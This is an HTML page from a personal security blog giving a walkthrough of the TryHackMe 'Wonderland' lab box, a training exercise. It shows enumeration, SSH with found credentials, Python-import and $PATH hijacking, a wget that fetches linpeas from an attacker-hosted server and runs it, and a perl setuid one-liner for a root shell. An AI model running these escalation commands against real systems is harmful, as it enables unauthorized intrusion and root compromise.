@@ -1,0 +1,148 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta http-equiv=content-language content="en">
+<meta name=color-scheme content="light dark">
+<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
+<meta name=author content="Kiel Vaughn">
+<meta name=description content="Wonderland is a medium difficulty box on TryHackMe. Below are the steps taken to fully compromise this box.
+First, let&rsquo;s run threader3000 to see what ports are open.
+This shows that two ports are open, 22 and 80. Let&rsquo;s run nmap -A -p 22,80 [machine ip] and see what information we are able to enumerate from this scan.
+It appears that Goland is used as the web server. Visiting the website we see a picture of a white rabbit.">
+<meta name=keywords content="blog,cybersecurity,personal">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Wonderland - TryHackMe">
+<meta name=twitter:description content="Wonderland is a medium difficulty box on TryHackMe. Below are the steps taken to fully compromise this box.
+First, let&rsquo;s run threader3000 to see what ports are open.
+This shows that two ports are open, 22 and 80. Let&rsquo;s run nmap -A -p 22,80 [machine ip] and see what information we are able to enumerate from this scan.
+It appears that Goland is used as the web server. Visiting the website we see a picture of a white rabbit.">
+<meta property="og:title" content="Wonderland - TryHackMe">
+<meta property="og:description" content="Wonderland is a medium difficulty box on TryHackMe. Below are the steps taken to fully compromise this box.
+First, let&rsquo;s run threader3000 to see what ports are open.
+This shows that two ports are open, 22 and 80. Let&rsquo;s run nmap -A -p 22,80 [machine ip] and see what information we are able to enumerate from this scan.
+It appears that Goland is used as the web server. Visiting the website we see a picture of a white rabbit.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://www.kielvaughn.com/ctfs/2020-07-24-wonderland/"><meta property="article:section" content="ctfs">
+<meta property="article:published_time" content="2020-07-24T00:00:00+00:00">
+<meta property="article:modified_time" content="2020-07-24T00:00:00+00:00">
+<title>
+Wonderland - TryHackMe · Kiel Vaughn, CISSP
+</title>
+<link rel=canonical href=http://www.kielvaughn.com/ctfs/2020-07-24-wonderland/>
+<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
+<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
+<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
+<link rel=apple-touch-icon href=/assets/img/cissp.ico>
+<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
+<meta name=generator content="Hugo 0.88.1">
+</head>
+<body class="preload-transitions colorscheme-dark">
+<main class=wrapper>
+<nav class=navigation>
+<section class=container>
+<a class=navigation-title href=/>
+Kiel Vaughn, CISSP
+</a>
+<input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle>
+<i class="fa fa-bars fa-fw" aria-hidden=true></i>
+</label>
+<ul class=navigation-list>
+<li class=navigation-item>
+<a class=navigation-link href=/whoami/>whoami</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/certifications/>certifications</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/posts/>blog</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
+</li>
+</ul>
+</section>
+</nav>
+<div class=content>
+<section class="container page">
+<article>
+<header>
+<h1 class=title>
+<a class=title-link href=http://www.kielvaughn.com/ctfs/2020-07-24-wonderland/>
+Wonderland - TryHackMe
+</a>
+</h1>
+</header>
+<p>Wonderland is a medium difficulty box on <a href=https://www.tryhackme.com>TryHackMe</a>. Below are the steps taken to fully compromise this box.</p>
+<p>First, let&rsquo;s run <strong>threader3000</strong> to see what ports are open.</p>
+<p><img src=/assets/img/Wonderland1.png alt="Wonderland threader3000"></p>
+<p>This shows that two ports are open, 22 and 80. Let&rsquo;s run <strong>nmap -A -p 22,80 [machine ip]</strong> and see what information we are able to enumerate from this scan.</p>
+<p><img src=/assets/img/Wonderland2.png alt="Wonderland nmap"></p>
+<p>It appears that Goland is used as the web server. Visiting the website we see a picture of a white rabbit.</p>
+<p><img src=/assets/img/Wonderland3.png alt="Wonderland website"></p>
+<p>However, there is nothing in the source code to see. Let&rsquo;s run <strong>gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50</strong> and see if we are able to locate any other directories.</p>
+<p><img src=/assets/img/Wonderland4.png alt="Wonderland gobuster 1"></p>
+<p>gobuster returned a couple of results to review. the <strong>/poem</strong> subdirectory just had the poem, The Jabberwocky on it. <strong>/r</strong> told you to keep on going.</p>
+<p><img src=/assets/img/Wonderland5.png alt="Wonderland /r"></p>
+<p>At this point, I ran <strong>gobuster dir -u http://[machine ip]/r/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50</strong>, and it returned a subdirectory of <strong>/a</strong></p>
+<p><img src=/assets/img/Wonderland6.png alt="Wonderland gobuster2"></p>
+<p>At this point, I remember it stated to follow the White Rabbit, and since /r/a were the beginning of rabbit, I decided to try going to <strong>http://[machine ip]/r/a/b/b/i/t</strong> This leads to a page telling you to enter wonderland, but nothing is clickable on the page.</p>
+<p><img src=/assets/img/Wonderland7.png alt="Wonderland /r/a/b/b/i/t"></p>
+<p>I decided to take a look at the source code for the page, and it appears that there were potentially a set of hidden credentials that might be useable to SSH into the server.</p>
+<p><img src=/assets/img/Wonderland8.png alt="Wonderland alice credentials"></p>
+<p>Let&rsquo;s try to ssh into the victim with <strong>ssh alice@[machine ip]</strong>.</p>
+<p><img src=/assets/img/Wonderland9.png alt="Wonderland alice ssh"></p>
+<p>Success! We were able to connect via ssh as alice. Let&rsquo;s take a look around. <strong>ls -al</strong> shows that root.txt is in this folder, but we cannot read it. Running <strong>python3 walrus_and_the_carpenter.py</strong> just returns 10 random lines of text from the script.</p>
+<p><img src=/assets/img/Wonderland10.png alt="Wonderland alice home directory"></p>
+<p>Since root.txt is in the user folder, let&rsquo;s see if the user flag is in the root folder with <strong>cat /root/user.txt</strong>. We&rsquo;ve found the user flag!</p>
+<p><img src=/assets/img/Wonderland11.png alt="Wonderland user.txt"></p>
+<p>Let&rsquo;s run <strong>sudo -l</strong> and see if alice can run something as a different user. We can see that she can run python 3.6 as another user, rabbit.</p>
+<p><img src=/assets/img/Wonderland12.png alt="Wonderland alice sudo -l"></p>
+<p>It appears that we can open python 3.6 as rabbit by running the walrus_and_the_carpenter.py script. Let&rsquo;s take a look at that script first.</p>
+<p><img src=/assets/img/Wonderland13.png alt="Wonderland walrus_and_the_carpenter.py"></p>
+<p>With python, if you name a file with the same name as something that is imported in the same directory, it will import that file instead of the module. Let&rsquo;s create a script file with <strong>nano random.py</strong> and put in the code below.</p>
+<p><img src=/assets/img/Wonderland14.png alt="Wonderland random.py"></p>
+<p>Save this file and then run <strong>sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</strong>. You should now have a shell as rabbit.</p>
+<p><img src=/assets/img/Wonderland15.png alt="Wonderland rabbit"></p>
+<p>I attempted to run <strong>sudo -l</strong> as rabbit, but we do not have this user&rsquo;s password to see what permissions they might potentially have. I navigated to rabbit&rsquo;s home folder with <strong>cd /home/rabbit</strong> and ran <strong>ls -al</strong> to list the directory&rsquo;s contents.</p>
+<p><img src=/assets/img/Wonderland16.png alt="Wonderland rabbit home directory"></p>
+<p>It appears that there is a SUID file in this folder. Let&rsquo;s run it and see what happens.</p>
+<p><img src=/assets/img/Wonderland17.png alt="Wonderland teaParty"></p>
+<p>At this point you can enter whatever you would like, and the program crashes. It also appears to display some text with time an hour ahead of the current time. Since we likely do not have any tools on this machine for analyzing the binary, let&rsquo;s run <strong>nano teaParty</strong> to see if we can find anything useful in the file. We can see that the <strong>date</strong> binary is called without an absolute path, let&rsquo;s use that to our advantage.</p>
+<p><img src=/assets/img/Wonderland18.png alt="Wonderland nano teaParty"></p>
+<p>Let&rsquo;s add /tmp to rabbit&rsquo;s $PATH variable with <strong>export PATH="/tmp:$PATH"</strong>. This will put /tmp as the first folder that is looked at for binaries that do not have an absolute path defined.</p>
+<p><img src=/assets/img/Wonderland19.png alt="Wonderland $PATH"></p>
+<p>Next, run <strong>cd /tmp</strong> followed by <strong>nano date</strong>. Put in the two lines of codes below which can be used to launch a bash shell.</p>
+<p><img src=/assets/img/Wonderland20.png alt="Wonderland /tmp/date bash shell"></p>
+<p>Save and exit nano, and then run <strong>cd /home/rabbit</strong>, and run <strong>chmod +x /tmp/date</strong> to make the date file executable. Now, execute <strong>./teaParty</strong>. This should give you a shell as hatter!</p>
+<p><img src=/assets/img/Wonderland21.png alt="Wonderland hatter shell access"></p>
+<p>Next, let&rsquo;s navigate to hatter&rsquo;s home directory with <strong>cd /home/hatter</strong> and run <strong>ls -al</strong>. There is a <strong>password.txt</strong> file there. Let&rsquo;s run <strong>cat password.txt</strong>.</p>
+<p><img src=/assets/img/Wonderland22.png alt="Wonderland hatter password.txt"></p>
+<p>In another terminal window on your attacker pc, run **ssh hatter@[machine ip] ** and use the password you just uncovered. You should be able to connect as hatter.</p>
+<p><img src=/assets/img/Wonderland23.png alt="Wonderland hatter ssh"></p>
+<p>hatter is not able to run <strong>sudo -l</strong>, so I next decided to enumerate with linpeas. On my attacker computer, I ran <strong>python3 -m http.server</strong> to spin up a temporary http server.</p>
+<p><img src=/assets/img/Wonderland24.png alt="Wonderland python3 http server"></p>
+<p>Next, I ran <strong>wget http://[attacker ip]:8000/linpeas.sh</strong> to download it locally onto the victim computer. I then ran <strong>chmod +x linpeas.sh</strong> to make it executable followed by <strong>./linpeas.sh</strong></p>
+<p><img src=/assets/img/Wonderland25.png alt="Wonderland linpeas"></p>
+<p>In the middle of enumeration, it shows that perl has the <strong>cap_setuid+ep</strong> capability. This can be used to gain a root shell. Let&rsquo;s take a look at <a href=https://gtfobins.github.io/>GTFOBins</a> to find a way to escalate to root. It appears you can run <strong>perl -e &lsquo;use POSIX qw(setuid); POSIX::setuid(0); exec &ldquo;/bin/sh&rdquo;;'</strong> to gain a root shell. Let&rsquo;s give it a try.</p>
+<p><img src=/assets/img/Wonderland27.png alt="Wonderland root shell"></p>
+<p>Awesome, now we just need to run <strong>cat /home/alice/root.txt</strong> to get the root flag!</p>
+<p><img src=/assets/img/Wonderland28.png alt="Wonderland root.txt"></p>
+</article>
+</section>
+</div>
+<footer class=footer>
+<section class=container>
+©
+2020 -
+2021
+Kiel Vaughn
+</section>
+</footer>
+</main>
+<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
+</body>
+</html>
